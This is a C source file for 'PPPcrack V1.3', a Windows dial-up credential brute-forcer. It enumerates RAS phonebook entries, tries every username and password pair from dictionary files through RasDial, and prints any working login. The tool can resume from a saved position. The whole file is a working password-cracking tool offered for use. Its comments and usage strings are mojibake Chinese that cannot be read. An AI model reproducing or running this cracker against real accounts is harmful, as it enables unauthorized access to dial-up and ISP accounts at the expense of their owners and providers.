#include <stdio.h>
#include <windows.h>
#include <ras.h>


#pragma comment(lib,"rasapi32.lib")

RASDIALPARAMS	RasDialParams;
HRASCONN		hRasConn;

DWORD  ppp_Dial();
void ppp_Enum();
void ppp_Crack(char *userDic,char *passDic,int p_time);

void ppp_ver()
{
printf("#================PPPcrack V1.3================#\n");
printf("|         Written by JeeWin                   |\n");
printf("|         Email:jeewinchang@21cn.com          |\n");
printf("|         Date:2007.1.26                      |\n");
printf("#=============================================#\n");
}

void Usage(char *progname) 
{
	ppp_ver();
	printf("Usage:\n%s \t-e <������> -u <�û����ֵ��ļ���> -p <�����ֵ��ļ���>\n", progname);
	printf("\t -t [ʱ��:Ĭ��ֵΪ16] /m [ö�ٿ�������]\n");
	exit(0);
}

void main(int argc, char *argv[])
{
	int i, p_j = 0;
	char * userDic;
	char * passDic;
	int  p_time	=	16;	// ʱ��

	// ��ʼ��RasDialParams
	RasDialParams.dwSize = sizeof(RASDIALPARAMS);
	strcpy(RasDialParams.szEntryName, "");
	strcpy(RasDialParams.szPhoneNumber, "");
	strcpy(RasDialParams.szUserName, "");
	strcpy(RasDialParams.szPassword, "");
	strcpy(RasDialParams.szDomain, "");
	if (argc > 1) 
	{
		for(i=1; i<argc; i++) 
		{
			if ((argv[i][0] == '-') || (argv[i][0] == '/')) 
			{
				switch(tolower(argv[i][1])) 
				{
					case 'e': 
						strcpy(RasDialParams.szEntryName, argv[++i]);
						p_j += 1;//�жϲ����Ƿ���ȫ
						break;
					case 'u': 
						userDic = argv[++i];
						p_j += 1;
						break;
					case 'p': 
						passDic = argv[++i];
						p_j += 1;
						break;
					case 'm': 
						ppp_Enum();//ö�ٿ�������
						break;
					case 't': 
						p_time = atoi(argv[++i]);
						break;
					default:
						Usage(argv[i]);
						break;
				}
			}
			else
				Usage(argv[0]);
		}
	}
	else
		Usage(argv[0]);
	if (p_j == 3)
		ppp_Crack(userDic, passDic, p_time);
	else
	{
		ppp_ver();
		printf("-������ȫ!\n");
	}
	return;
}

DWORD ppp_Dial()
{
	hRasConn = NULL;
	DWORD Ret = RasDial(NULL, NULL, &RasDialParams, 0, NULL, &hRasConn); // ����
	return Ret;
}

// ö������
void ppp_Enum()
{
	DWORD dwSize, dwEntries;
	LPBYTE lpBuffer;

	LPRASENTRYNAME lpRasEntryName = new RASENTRYNAME;
	dwSize = sizeof(RASENTRYNAME);
	lpBuffer = new BYTE[dwSize];
	lpRasEntryName = (LPRASENTRYNAME)lpBuffer;
	lpRasEntryName->dwSize = sizeof(RASENTRYNAME);
	RasEnumEntries(NULL, NULL, lpRasEntryName, &dwSize, &dwEntries);

	ppp_ver();
	if(dwEntries>0)
	{
		for(DWORD j=0; j<dwEntries; lpRasEntryName++, j++)
			printf("-����%d:%s\n",j+1,lpRasEntryName->szEntryName);
	}
	else
		printf("-û�п��õĲ�������!/n");
	exit(0);
}
void ppp_Crack(char *userDic,char *passDic, int p_time)
{
	
	FILE* fUserDic, *fPassDic;

	ppp_ver();

	fUserDic = fopen(userDic,"r");
	fPassDic = fopen(passDic,"r");

	if(!fUserDic && fPassDic)
	{
		printf("-���ܴ��û����ֵ��ļ�%s!\n", userDic);
		fclose(fPassDic);
	}
	else if(fUserDic && !fPassDic)
	{
		printf("-���ܴ������ֵ��ļ�%s!\n", passDic);
		fclose(fUserDic);
	}
	else if(!fUserDic && !fPassDic)
	{
		printf("-���ܴ��û����ֵ��ļ�%s!\n", userDic);
		printf("-���ܴ������ֵ��ļ�%s!\n", passDic);
	}
	else
	{
		long userLine = 1;
		long passLine = 1;
		
		char userName[20];
		char passWord[20];
		
		FILE *fBreak;
		fBreak = fopen("break.txt","r");
		if (fBreak)
		{
			fscanf(fBreak, "%d%d", &userLine, &passLine);
			char temp[20];
			for (int i=1; i<userLine; ++i)
			{
				fgets(temp, 20, fUserDic);
			}
			for (int i=1; i<passLine; ++i)
			{
				fgets(temp, 20, fPassDic);
			}
			fclose(fBreak);
		}

		printf("-ʱ��Ϊ:%d\n", p_time);
		printf("-�û����ֵ��ļ���:%s\n", userDic);
		printf("-�����ֵ��ļ���:%s\n", passDic);
		
		while (fgets(userName,20,fUserDic))
		{
			userName[strlen(userName)-1] = 0;
			strcpy(RasDialParams.szUserName, userName);
			
			while (fgets(passWord, 20, fPassDic))
			{
				passWord[strlen(passWord)-1] = 0;
				strcpy(RasDialParams.szPassword, passWord);
				for (int i=0; i<=10; ++i)
				{
					Sleep(p_time); 
					DWORD ret = ppp_Dial();
					//DWORD ret = -1;
					if ( 0 == ret )
					{
						printf("\n-GOOD!�ƽ�ɹ�,�û���Ϊ:%s,����Ϊ:%s\n",
							RasDialParams.szUserName, RasDialParams.szPassword);
						Sleep(p_time);
						RasHangUp(hRasConn); // �Ͽ�
						Sleep(p_time);
						goto loop;
					}
					else if ( 691 == ret)
					{ 
						printf("-�û���:%s,����:%s-�û�����%d��,�����%d��                 \r",
							RasDialParams.szUserName, RasDialParams.szPassword, userLine, passLine);
						break;
					}
					else
					{
						printf("-�û���:%s,����:%s-�쳣��%d��,����ֵ:%d                    \r",
							RasDialParams.szUserName, RasDialParams.szPassword, i, ret);
						if ( 10 == i)
						{
							printf("-�û���:%s,����:%s-�û�����%d��,�����%d��                 \r",
								RasDialParams.szUserName, RasDialParams.szPassword, userLine, passLine);
							RasHangUp(hRasConn);
							printf("-�����쳣!");
							return;
						}
					}
				}
				passLine++;
			}
loop:		userLine++;
			passLine = 1;
			fseek(fPassDic, 0L, SEEK_SET);
		}
	fclose(fPassDic);
	fclose(fUserDic);
	}
}
